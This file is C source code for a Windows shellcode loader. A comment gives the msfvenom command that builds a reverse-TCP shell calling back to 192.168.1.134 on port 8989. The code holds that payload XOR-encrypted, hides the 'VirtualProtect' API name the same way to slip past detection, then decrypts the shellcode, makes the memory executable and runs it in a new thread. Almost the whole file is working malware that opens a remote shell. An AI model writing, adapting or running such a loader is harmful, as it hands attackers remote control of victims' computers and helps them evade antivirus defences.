/*
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.1.134 LPORT=8989 > reverse2.bin

*/
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>


BOOL (WINAPI * pVirtualProtect)( LPVOID lpAddress,   SIZE_T dwSize,   DWORD  flNewProtect, PDWORD lpflOldProtect);
void XOR(char * data, size_t data_len, char * key, size_t key_len) {
	int j;
	
	j = 0;
	for (int i = 0; i < data_len; i++) {
		if (j == key_len - 1) j = 0;

		data[i] = data[i] ^ key[j];
		j++;
	}
}
unsigned char reverse_payload[] = { 0x9d, 0x2a, 0xe0, 0x80, 0x95, 0x8e, 0xa7, 0x68, 0x69, 0x6a, 0x2a, 0x3d, 0x2c, 0x3e, 0x3d, 0x21, 0x27, 0x3a, 0x42, 0xa6, 0x10, 0x3e, 0xfc, 0x2a, 0x19, 0x32, 0xea, 0x30, 0x7b, 0x2c, 0xee, 0x34, 0x47, 0x20, 0xe2, 0x18, 0x3b, 0x24, 0x62, 0xd9, 0x25, 0x3a, 0x3c, 0x43, 0xba, 0x3c, 0x44, 0xb6, 0xdb, 0x44, 0x18, 0x6, 0x63, 0x4e, 0x43, 0x25, 0xa4, 0xaf, 0x6a, 0x29, 0x68, 0xab, 0x89, 0x81, 0x3f, 0x2f, 0x3e, 0x38, 0xfa, 0x20, 0x53, 0xff, 0x37, 0x4a, 0x3f, 0x79, 0xa9, 0xf1, 0xe1, 0xea, 0x63, 0x64, 0x65, 0x2e, 0xe2, 0xa8, 0x1d, 0xd, 0x23, 0x6d, 0xbd, 0x3e, 0xe4, 0x38, 0x69, 0x36, 0xf8, 0x34, 0x55, 0x3f, 0x76, 0xa8, 0x9a, 0x2c, 0x29, 0x9d, 0xaa, 0x25, 0xee, 0x52, 0xef, 0x20, 0x68, 0xbc, 0x26, 0x5d, 0xa4, 0x26, 0x5e, 0xb0, 0xdd, 0x33, 0xb2, 0xbd, 0x78, 0x37, 0x76, 0xb9, 0x41, 0x9a, 0x14, 0x93, 0x2f, 0x67, 0x29, 0x42, 0x6f, 0x2d, 0x50, 0xbb, 0x1e, 0xb4, 0x35, 0x2a, 0xe4, 0x30, 0x55, 0x3b, 0x72, 0xa4, 0x13, 0x37, 0xfc, 0x74, 0x31, 0x3e, 0xea, 0x22, 0x7f, 0x2d, 0x64, 0xb6, 0x26, 0xe3, 0x6d, 0xe2, 0x23, 0x6d, 0xbd, 0x2f, 0x37, 0x31, 0x29, 0x2c, 0x2a, 0x2e, 0x34, 0x2e, 0x36, 0x21, 0x38, 0x20, 0x29, 0xe1, 0x8f, 0x44, 0x24, 0x34, 0x98, 0x88, 0x31, 0x2b, 0x32, 0x36, 0x25, 0xe5, 0x7d, 0x99, 0x26, 0x8d, 0x8c, 0x8b, 0x28, 0x3f, 0xc9, 0xf, 0xa, 0x48, 0x3e, 0x51, 0x51, 0x64, 0x65, 0x27, 0x31, 0x21, 0xe0, 0x8c, 0x23, 0xed, 0x81, 0xce, 0x6e, 0x70, 0x71, 0x3b, 0xfa, 0x91, 0x3c, 0xca, 0x75, 0x78, 0x5a, 0x67, 0xa1, 0xca, 0x62, 0xe2, 0x24, 0x32, 0x2e, 0xe1, 0x8d, 0x26, 0xe2, 0x9d, 0x2c, 0xd4, 0x23, 0x7, 0x57, 0x75, 0x8c, 0xa1, 0x39, 0xff, 0x9d, 0x10, 0x78, 0x7b, 0x61, 0x62, 0x3a, 0x25, 0xdf, 0x4f, 0xe7, 0x3, 0x69, 0x95, 0xbe, 0x3c, 0x3d, 0x23, 0x5e, 0xb9, 0x3c, 0x43, 0xb3, 0x3c, 0x8a, 0xb6, 0x3f, 0xf1, 0xbb, 0x32, 0x9e, 0xa2, 0x2b, 0xed, 0xa4, 0x27, 0xdd, 0x82, 0x66, 0xb5, 0x8b, 0x93, 0xb8, 0x26, 0xe6, 0xb7, 0x1b, 0x62, 0x32, 0x2c, 0x39, 0xff, 0x95, 0x30, 0xf0, 0x83, 0x20, 0xd8, 0xfa, 0xc1, 0x11, 0x7, 0x98, 0xbd, 0x21, 0xeb, 0xaf, 0x2c, 0x6f, 0x6e, 0x6f, 0x39, 0xc9, 0x11, 0x1e, 0x10, 0x75, 0x76, 0x77, 0x78, 0x79, 0x3b, 0x31, 0x23, 0x33, 0x2c, 0xec, 0x84, 0x30, 0x3f, 0x3e, 0x27, 0x5a, 0xac, 0x7, 0x63, 0x36, 0x31, 0x21, 0x90, 0x8f, 0x12, 0xb2, 0x32, 0x53, 0x2c, 0x78, 0x7b, 0x29, 0xef, 0x27, 0x40, 0x7d, 0xa0, 0x67, 0x0, 0x21, 0xe3, 0x8d, 0x3a, 0x3d, 0x2f, 0x3f, 0x31, 0x21, 0x33, 0x23, 0x3d, 0x8a, 0xb6, 0x36, 0x28, 0x30, 0x85, 0xa9, 0x2f, 0xea, 0xa5, 0x29, 0xef, 0xa6, 0x29, 0xd3, 0x13, 0xa7, 0x53, 0xeb, 0x91, 0xba, 0x38, 0x40, 0xa0, 0x3b, 0x8b, 0xbf, 0xfd, 0x79, 0x39, 0xc3, 0x72, 0xe6, 0x7f, 0x3, 0x9b, 0xb0, 0xdd, 0x97, 0xdd, 0xcb, 0x3c, 0x2a, 0xd6, 0xcb, 0xfb, 0xd2, 0xed, 0x8e, 0xa7, 0x3b, 0xf7, 0xb1, 0x5e, 0x4b, 0x7e, 0x5, 0x70, 0xe1, 0x99, 0x83, 0x11, 0x60, 0xdd, 0x20, 0x7b, 0x1b, 0x5, 0x1, 0x6c, 0x34, 0x2f, 0xe6, 0xaa, 0x8e, 0xa7 };
unsigned int reverse_len = sizeof(reverse_payload);
char key[] = "abcdefghijklmnopqrstuvwxyz";
char sVirtualProtect[] = { 0x37, 0xb, 0x11, 0x10, 0x10, 0x7, 0xb, 0x38, 0x1b, 0x5, 0x1f, 0x9, 0xe, 0x1a };

int main(void) {
    
	void * exec_mem;
	BOOL rv;
	HANDLE th;
    DWORD oldprotect = 0;

	// Allocate buffer for payload
	exec_mem = VirtualAlloc(0, reverse_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	//printf("%-20s : 0x%-016p\n", "reverse_payload addr", (void *)reverse_payload);
	//printf("%-20s : 0x%-016p\n", "exec_mem addr", (void *)exec_mem);
	//printf("\nDecrypt malious payload!\n");
	getchar();
	// Decrypt (DeXOR) the payload
	XOR((char *) reverse_payload, reverse_len, key, sizeof(key));
	//printf("\nDecrypt  obfuscate funciton!\n");
	//getchar();
	
	// Copy payload to the buffer
	RtlMoveMemory(exec_mem, reverse_payload, reverse_len);
	//printf("\n load virtual alloc!\n");
	//getchar();
	XOR((char *) sVirtualProtect, strlen(sVirtualProtect), key, sizeof(key));
	//printf("\n copy payload to buffer!\n");
	//getchar();
	pVirtualProtect = GetProcAddress(GetModuleHandle("kernel32.dll"), sVirtualProtect);
	
	// Copy payload to the buffer
	RtlMoveMemory(exec_mem, reverse_payload, reverse_len);
	
	// Make the buffer executable
	rv = pVirtualProtect(exec_mem, reverse_len, PAGE_EXECUTE_READ, &oldprotect);


	//printf("\nHit me!\n");
	//getchar();

	// If all good, run the payload
	if ( rv != 0 ) {
			th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE) exec_mem, 0, 0, 0);
			WaitForSingleObject(th, -1);
	}

	return 0;
}
